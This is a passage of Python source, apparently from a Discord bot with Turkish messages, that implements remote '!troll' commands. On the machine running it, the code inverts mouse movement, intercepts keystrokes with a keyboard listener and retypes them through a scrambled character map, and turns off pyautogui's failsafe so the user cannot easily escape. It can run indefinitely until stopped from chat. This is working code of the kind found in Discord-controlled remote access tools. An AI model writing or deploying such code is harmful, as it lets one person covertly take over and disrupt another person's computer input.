    # ─── MOUSE ───
    if komut == "mouse":
        if mouse_troll_active:
            await ctx.send("❌ Fare zaten troll modunda!")
            return
        
        mouse_troll_active = True
        sure = None
        if len(parts) > 1 and parts[1].isdigit():
            sure = int(parts[1])
            if sure < 1:
                sure = 1
        
        def mouse_troll_thread_func():
            global mouse_troll_active
            import pyautogui
            pyautogui.FAILSAFE = False
            start_time = time.time()
            last_x, last_y = pyautogui.position()
            while mouse_troll_active:
                try:
                    if sure and (time.time() - start_time > sure):
                        break
                    current_x, current_y = pyautogui.position()
                    if current_x != last_x or current_y != last_y:
                        diff_x = current_x - last_x
                        diff_y = current_y - last_y
                        new_x = current_x - (diff_x * 2)
                        new_y = current_y - (diff_y * 2)
                        screen_w, screen_h = pyautogui.size()
                        new_x = max(0, min(screen_w, new_x))
                        new_y = max(0, min(screen_h, new_y))
                        pyautogui.moveTo(new_x, new_y, duration=0.01)
                    last_x, last_y = pyautogui.position()
                    time.sleep(0.01)
                except:
                    pass
            mouse_troll_active = False
            if sure:
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"⏹️ Fare troll modu {sure} saniye sonra otomatik durduruldu."),
                    bot.loop
                )
        
        thread = threading.Thread(target=mouse_troll_thread_func, daemon=True)
        thread.start()
        troll_threads.append(thread)
        
        if sure:
            await ctx.send(f"🐭 **Fare troll modu aktif!** {sure} saniye sonra otomatik duracak.")
        else:
            await ctx.send("🐭 **Fare troll modu aktif!** Sonsuza kadar çalışacak. Durdurmak için `!troll stop`")
        return
    
    # ─── KEYBOARD ───
    if komut == "keyboard":
        if keyboard_troll_active:
            await ctx.send("❌ Klavye zaten troll modunda!")
            return
        
        keyboard_troll_active = True
        sure = None
        if len(parts) > 1 and parts[1].isdigit():
            sure = int(parts[1])
            if sure < 1:
                sure = 1
        
        chars = list(string.ascii_lowercase + string.ascii_uppercase + string.digits + ".,!?;:+-*/= ")
        shuffled = chars.copy()
        random.shuffle(shuffled)
        keyboard_mapping = dict(zip(chars, shuffled))
        
        def keyboard_troll_thread_func():
            global keyboard_troll_active, keyboard_mapping
            try:
                from pynput.keyboard import Listener, Key
                import pyautogui
                pyautogui.FAILSAFE = False
                start_time = time.time()
                def on_press(key):
                    global keyboard_troll_active, keyboard_mapping
                    if not keyboard_troll_active:
                        return True
                    if sure and (time.time() - start_time > sure):
                        return False
                    try:
                        char = key.char
                        if char and char in keyboard_mapping:
                            pyautogui.write(keyboard_mapping[char])
                            return False
                    except:
                        pass
                    return True
                listener = Listener(on_press=on_press)
                listener.start()
                listener.join()
            except ImportError:
                alt_active = True
                start_time = time.time()
                while alt_active:
                    if not keyboard_troll_active:
                        break
                    if sure and (time.time() - start_time > sure):
                        break
                    time.sleep(0.1)
            keyboard_troll_active = False
            keyboard_mapping = {}
            if sure:
                asyncio.run_coroutine_threadsafe(
                    ctx.send(f"⏹️ Klavye troll modu {sure} saniye sonra otomatik durduruldu."),
                    bot.loop
                )
        
        thread = threading.Thread(target=keyboard_troll_thread_func, daemon=True)
        thread.start()
        troll_threads.append(thread)
        
        if sure:
            await ctx.send(f"⌨️ **Klavye troll modu aktif!** {sure} saniye sonra otomatik duracak.")
        else:
            await ctx.send("⌨️ **Klavye troll modu aktif!** Sonsuza kadar çalışacak. Durdurmak için `!troll stop`")
        return
    
    # ─── STOP ───
    if komut == "stop":
        mouse_troll_active = False
        keyboard_troll_active = False
        keyboard_mapping = {}
        await ctx.send("✅ **Tüm troll'ler durduruldu!**")
        return
    
    await ctx.send(f"❌ Bilinmeyen komut: `{komut}`\nKullanım: `!troll help`")

